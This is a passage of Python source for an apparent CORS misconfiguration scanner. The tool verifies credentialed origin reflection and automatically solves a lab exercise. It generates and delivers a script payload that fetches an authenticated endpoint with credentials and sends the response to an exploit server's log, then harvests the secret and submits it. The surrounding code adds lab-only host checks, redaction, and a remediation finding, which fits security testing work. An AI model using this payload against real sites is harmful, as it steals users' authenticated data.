            and target_host.endswith(".lab")
            and exploit_host.endswith(".lab")
        )
        return public_pair or fixture_pair

    def _parse_exploit_form(self, body: str, exploit_url: str) -> Dict[str, Any]:
        parser = _ExploitFormParser()
        try:
            parser.feed(body)
        except Exception as exc:
            raise ValueError("exploit form HTML was malformed") from exc
        required = {"responseFile", "responseHead", "responseBody"}
        for form in parser.forms:
            fields = dict(form["fields"])
            if not required.issubset(fields):
                continue
            if form["method"] != "post":
                continue
            action_url = urljoin(exploit_url, form["action"] or urlsplit(exploit_url).path or "/")
            if not _same_origin(exploit_url, action_url):
                continue
            response_file = str(fields.get("responseFile") or "")
            stored_url = _safe_path_url(exploit_url, response_file)
            if not stored_url or not response_file.startswith("/"):
                continue
            actions = [str(value) for value in form.get("actions", []) if value]
            store = next((value for value in actions if "STORE" in value.upper()), None)
            deliver = next((value for value in actions if "DELIVER" in value.upper()), None)
            if store and deliver and store != deliver:
                log_url = next(
                    (
                        _safe_path_url(exploit_url, href)
                        for href in parser.hrefs
                        if re.search(r"(?:^|/)(?:log|access-log)(?:$|[/?])", href, re.I)
                    ),
                    None,
                )
                return {
                    "actionUrl": action_url,
                    "storedUrl": stored_url,
                    "fields": fields,
                    "storeAction": store,
                    "deliverAction": deliver,
                    "logUrl": log_url or urljoin(exploit_url, "/log"),
                }
        raise ValueError("exploit page lacked the required same-origin POST form semantics")

    async def _finalize_lab(
        self,
        *,
        target_pin: _PinnedOrigin,
        target: str,
        endpoint: str,
        root_before: Dict[str, Any],
        exploit_url: str,
        proof: Dict[str, Any],
    ) -> Dict[str, Any]:
        if not _is_unsolved(root_before["body"]):
            raise ValueError("lab root was not in an unambiguous unsolved state")
        if not self._valid_lab_pair(target, exploit_url):
            raise ValueError("observed exploit server did not match the closed public/lab pairing")
        unsolved = await self._request(target_pin, target, authenticated=True)
        if unsolved["status"] != 200 or not _is_unsolved(unsolved["body"]):
            raise ValueError("lab unsolved control failed")
        unsolved["evidenceBody"] = self._root_evidence_body(
            solved=False, exploit_url=exploit_url
        )

        exploit_pin = await self._resolve_origin(exploit_url)
        exploit_page = await self._request(exploit_pin, exploit_url, authenticated=False)
        if exploit_page["status"] != 200 or _is_redirect(exploit_page["status"]):
            raise ValueError("discovered exploit server did not return HTTP 200")
        form = self._parse_exploit_form(exploit_page["body"], exploit_url)
        exploit_page["evidenceBody"] = "<html><body>Exploit server</body></html>"

        policy = await self._request(
            target_pin,
            endpoint,
            authenticated=True,
            origin=exploit_pin.origin,
        )
        policy_json = _parse_sensitive_json(policy)
        if (
            policy["status"] != 200
            or policy_json is None
            or policy_json["canonical"] != proof["canonical"]
            or not _cors_headers_match(policy, exploit_pin.origin)
        ):
            raise ValueError("the discovered exploit Origin did not satisfy the proven CORS policy")
        policy["evidenceBody"] = json.dumps(
            {proof["sensitive"]["field"]: _marker(proof["sensitive"]["value"])},
            ensure_ascii=False,
            separators=(",", ":"),
            sort_keys=True,
        )

        nonce = "xasm-cors-" + secrets.token_hex(16)
        beacon = urljoin(exploit_pin.origin + "/", "log")
        script = (
            "<script>(()=>{const xasmNonce='" + nonce + "';fetch('" + endpoint
            + "',{credentials:'include'}).then(r=>r.text()).then(d=>{location='"
            + beacon
            + "?xasmCorsNonce='+encodeURIComponent(xasmNonce)+'&data='+encodeURIComponent(d)})})()</script>"
        )
        if len(script) > 4_096:
            raise ValueError("generated exploit exceeded the bounded content limit")
        fields = {
            str(key): str(value)
            for key, value in form["fields"].items()
            if str(key) in {"urlIsHttps", "responseFile", "responseHead", "responseBody"}
        }
        fields["responseFile"] = urlsplit(form["storedUrl"]).path
        fields["responseHead"] = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
        fields["responseBody"] = script
        if exploit_pin.scheme == "https":
            fields["urlIsHttps"] = fields.get("urlIsHttps") or "on"
        else:
            fields.pop("urlIsHttps", None)
        fields["formAction"] = form["storeAction"]
        stored = await self._request(
            exploit_pin, form["actionUrl"], method="POST", authenticated=False, form=fields
        )
        if stored["status"] != 200 or _is_redirect(stored["status"]):
            raise ValueError("exploit server rejected the bounded STORE action")
        stored["evidenceBody"] = "Exploit stored"
        content = await self._request(
            exploit_pin, form["storedUrl"], authenticated=False
        )
        if (
            content["status"] != 200
            or nonce not in content["body"]
            or endpoint not in content["body"]
            or beacon not in content["body"]
        ):
            raise ValueError("stored exploit content did not match the generated nonce-bound script")

        fields["formAction"] = form["deliverAction"]
        delivered = await self._request(
            exploit_pin, form["actionUrl"], method="POST", authenticated=False, form=fields
        )
        deliver_locations = _header_values(delivered, "location")
        deliver_location = (
            _safe_path_url(exploit_url, deliver_locations[0])
            if delivered["status"] == 302 and len(deliver_locations) == 1
            else None
        )
        if deliver_location is None:
            raise ValueError("exploit server rejected the bounded DELIVER action")
        parsed_delivery = urlsplit(deliver_location)
        if (
            not _same_origin(exploit_url, deliver_location)
            or parsed_delivery.path != "/deliver-to-victim"
            or parsed_delivery.query
            or parsed_delivery.fragment
        ):
            raise ValueError("exploit server returned an unexpected DELIVER redirect")
        delivery_follow = await self._request(
            exploit_pin, deliver_location, authenticated=False
        )
        follow_locations = _header_values(delivery_follow, "location")
        if (
            delivery_follow["status"] != 302
            or len(follow_locations) != 1
            or _safe_path_url(exploit_url, follow_locations[0]) != exploit_pin.origin + "/"
        ):
            raise ValueError("exploit delivery follow-up did not return to the exploit root")

        exfil_observation: Optional[Dict[str, Any]] = None
        exfil_secret: Optional[str] = None
        for attempt in range(MAX_LAB_POLLS):
            log = await self._request(exploit_pin, form["logUrl"], authenticated=False)
            if log["status"] == 200 and nonce in self._multi_decode(log["body"]):
                exfil_secret, receipt_path = self._extract_exfil(log["body"], nonce)
                exfil_observation = log
                if receipt_path:
                    receipt_url = _safe_path_url(exploit_url, receipt_path)
                    if not receipt_url:
                        raise ValueError("exfil receipt left the exploit origin")
                    receipt = await self._request(exploit_pin, receipt_url, authenticated=False)
                    if receipt["status"] != 200 or _is_redirect(receipt["status"]):
                        raise ValueError("one-time exfil receipt was unavailable")
                    exfil_secret = self._extract_receipt_value(receipt["body"], nonce)
                if exfil_secret:
                    break
            if attempt + 1 < MAX_LAB_POLLS:
                await asyncio.sleep(0.5)
        if not exfil_secret or exfil_observation is None:
            raise ValueError("bounded access-log polling did not recover nonce-linked exfiltration")
        self._secrets.add(exfil_secret)
        exfil_observation["evidenceBody"] = (
            f"nonce: {nonce} data: {_marker(exfil_secret)}"
        )

        solution_url = urljoin(target_pin.origin + "/", "submitSolution")
        submitted = await self._request(
            target_pin,
            solution_url,
            method="POST",
            authenticated=True,
            form={"answer": exfil_secret},
        )
        try:
            submit_json = json.loads(submitted["body"])
        except (TypeError, ValueError, json.JSONDecodeError):
            submit_json = {}
        if submitted["status"] != 200 or submit_json.get("correct") is not True:
            raise ValueError("lab solution endpoint did not confirm correct:true")
        submitted["evidenceRequestBody"] = "answer=" + _marker(exfil_secret)
        submitted["evidenceBody"] = '{"correct":true}'
        solved = await self._request(target_pin, target, authenticated=True)
        transition = _is_unsolved(root_before["body"]) and _is_solved(solved["body"])
        if solved["status"] != 200 or not transition:
            raise ValueError("lab root did not transition from Not solved to Solved")
        solved["evidenceBody"] = self._root_evidence_body(solved=True, exploit_url=exploit_url)

        steps = [
            self._evidence(LAB_LABELS[0], unsolved),
            self._evidence(LAB_LABELS[1], exploit_page),
            self._evidence(LAB_LABELS[2], policy),
            self._evidence(LAB_LABELS[3], stored),
            self._evidence(LAB_LABELS[4], content),
            self._evidence(LAB_LABELS[5], delivered),
            self._evidence(LAB_LABELS[6], delivery_follow),
            self._evidence(LAB_LABELS[7], exfil_observation),
            self._evidence(LAB_LABELS[8], submitted),
            self._evidence(LAB_LABELS[9], solved),
        ]
        return {
            "steps": steps,
            "labSolvedTransition": True,
            "exploitServerOrigin": exploit_pin.origin,
            "exfilNonceSha256": _sha(nonce),
            "exfilValueSha256": _sha(exfil_secret),
            "exfilValueLength": len(exfil_secret),
            "solutionAnswerSha256": _sha(exfil_secret),
            "stateChangingRequestCount": 4,
            "stateChangingMethods": ["POST", "POST", "GET", "POST"],
        }

    def _multi_decode(self, value: str) -> str:
        decoded = html.unescape(str(value or ""))
        for _ in range(3):
            newer = unquote_plus(decoded)
            if newer == decoded:
                break
            decoded = newer
        return decoded

    def _root_evidence_body(self, *, solved: bool, exploit_url: Optional[str]) -> str:
        state = "is-solved" if solved else "is-notsolved"
        label = "Solved" if solved else "Not solved"
        exploit = (
            f'<a href="{exploit_url}">Go to exploit server</a>' if exploit_url else ""
        )
        return (
            f'<html><body class="{state}"><a href="/my-account">My account</a>'
            f"{exploit}<p>{label}</p></body></html>"
        )

    def _extract_exfil(self, body: str, nonce: str) -> Tuple[Optional[str], Optional[str]]:
        decoded = self._multi_decode(body)
        if nonce not in decoded:
            return None, None
        receipt = RECEIPT_PATH_RE.search(decoded)
        if receipt:
            return None, receipt.group(1)
        receipt_value = RECEIPT_VALUE_RE.search(decoded)
        if receipt_value:
            return None, "/exfil-value?receipt=" + receipt_value.group(1)
        for match in re.finditer(r"\{", decoded):
            try:
                parsed, _end = json.JSONDecoder().raw_decode(decoded[match.start() :])
            except (TypeError, ValueError, json.JSONDecodeError):
                continue
            if not isinstance(parsed, dict):
                continue
            _sanitized, sensitive = _sanitize_json(parsed)
            if sensitive:
                sensitive.sort(key=lambda row: (row["rank"], row["field"]))
                return sensitive[0]["value"], None
        return None, None

    def _extract_receipt_value(self, body: str, nonce: str) -> Optional[str]:
        try:
            payload = json.loads(body)
        except (TypeError, ValueError, json.JSONDecodeError):
            return None
        if not isinstance(payload, dict) or str(payload.get("nonce") or "") != nonce:
            return None
        value = payload.get("value")
        if not isinstance(value, (str, int, float)) or not str(value):
            return None
        return str(value)

    def _sanitize_text(self, value: Any, extra: Iterable[str] = ()) -> str:
        safe = str(value or "").replace("\0", "")
        secret_values = {
            str(secret)
            for secret in [*getattr(self, "_secrets", set()), *extra]
            if secret is not None and len(str(secret)) >= 1
        }
        for secret in sorted(secret_values, key=len, reverse=True):
            safe = safe.replace(secret, _marker(secret))
        safe = re.sub(
            r"(?im)^(authorization|cookie|set-cookie|proxy-authorization|x-api-key)\s*:.*$",
            lambda match: f"{match.group(1)}: [REDACTED]",
            safe,
        )
        return EMAIL_RE.sub(lambda match: _marker(match.group(0)), safe)

    def _evidence(self, label: str, observation: Dict[str, Any]) -> Dict[str, Any]:
        request_lines = observation["rawRequest"].split("\r\n")
        request = "\r\n".join(
            line
            for line in request_lines
            if line.split(":", 1)[0].strip().lower() not in SENSITIVE_HEADER_NAMES
        )
        request = self._sanitize_text(request)
        if "evidenceRequestBody" in observation:
            request_head = request.split("\r\n\r\n", 1)[0]
            request = request_head + "\r\n\r\n" + str(observation["evidenceRequestBody"])
        if "\r\n\r\n" in request:
            request_head, request_body = request.split("\r\n\r\n", 1)
            if re.search(r"(?im)^Content-Length:\s*\d+\s*$", request_head):
                request_head = re.sub(
                    r"(?im)^Content-Length:\s*\d+\s*$",
                    f"Content-Length: {len(request_body.encode('utf-8'))}",
                    request_head,
                )
            request = request_head + "\r\n\r\n" + request_body
        body = self._sanitize_text(observation.get("evidenceBody", observation.get("body", "")))
        safe_headers: List[Tuple[str, str]] = []
        for name, value in observation.get("headers", []):
            lower = name.lower()
            if lower in SENSITIVE_HEADER_NAMES:
                continue
            if lower in {
                "content-type",
                "access-control-allow-origin",
                "access-control-allow-credentials",
                "cache-control",
                "location",
            }:
                safe_headers.append((name, self._sanitize_text(value)))
        response_lines = [f"HTTP/1.1 {observation['status']} Xasm"]
        response_lines.extend(f"{name}: {value}" for name, value in safe_headers)
        response_lines.append(f"Content-Length: {len(body.encode('utf-8'))}")
        response = "\r\n".join(response_lines) + "\r\n\r\n" + body
        return {
            "label": label,
            "url": observation["url"],
            "request": request,
            "requestSha256": _sha(request),
            "response": response,
            "responseSha256": _sha(response),
            "responseBodySha256": _sha(body),
            "responseBodyLength": len(body.encode("utf-8")),
            "responseStatus": observation["status"],
            "responseExcerptTruncated": False,
            "authContextSha256": (
                self._auth_context_sha if observation.get("authenticated") is True else None
            ),
        }

    def _finding(self, endpoint: str, verification: Dict[str, Any]) -> Dict[str, Any]:
        decisive = next(
            step
            for step in verification["corsEvidence"]["steps"]
            if step["label"] == "cors-attacker-origin-primary-proof"
        )
        return {
            "template-id": "xasm-cors-credentialed-origin-reflection-verified",
            "matcher-name": "two-origin-credentialed-sensitive-json-read",
            "matched-at": endpoint,
            "host": _origin_value(endpoint),
            "type": "http",
            "request": decisive["request"],
            "response": decisive["response"],
            "evidence": verification,
            "extracted-results": [
                f"sensitive-field:{verification['sensitiveField']}",
                f"value-sha256:{verification['sensitiveValueSha256']}",
                f"value-length:{verification['sensitiveValueLength']}",
            ],
            "info": {
                "name": "Credentialed CORS Origin Reflection Exposes Sensitive Data",
                "severity": "high",
                "description": (
                    "A sensitive authenticated JSON response reflected two independent attacker "
                    "Origins and enabled credentialed browser reads with stable response content."
                ),
                "remediation": (
                    "Use a strict exact Origin allow-list, emit one validated ACAO value, and do "
                    "not enable credentialed CORS for untrusted origins."
                ),
                "classification": {"cwe-id": ["CWE-942", "CWE-200"]},
            },
        }

    def _no_finding(self, target: str, proof_level: str, reason: str) -> Dict[str, Any]:
        verification = {
            "verified": False,
            "fallback": False,
            "mode": MODE,
            "proofLevel": proof_level,
            "requestCount": self._requests,
            "reason": self._sanitize_text(reason),
            "networkDestinationPreserved": True,
            "destinationIpPinned": True,
            "dnsResolvedOnce": True,
            "freshConnectionPerRequest": True,
            "redirectsFollowed": False,
            "cookieJarUsed": False,
        }
        return {
            "success": True,
            "tool": self.name,
            "target": target,
            "mode": MODE,
            "proofLevel": proof_level,
            "verified": False,
            "fallback": False,
            "requestCount": self._requests,
            "findings": [],
            "total_findings": 0,
            "verification": verification,
            "summary": {"requests": self._requests, "findings": 0, "fallback": False},
        }

    def _error(self, message: str, target: Optional[str] = None) -> Dict[str, Any]:
        return {
            "success": False,
            "tool": self.name,
            "target": target,
            "mode": MODE,
            "verified": False,
            "fallback": False,
            "error": self._sanitize_text(message),
            "findings": [],
        }


def get_tool() -> WebCorsProbeTool:
    return WebCorsProbeTool()
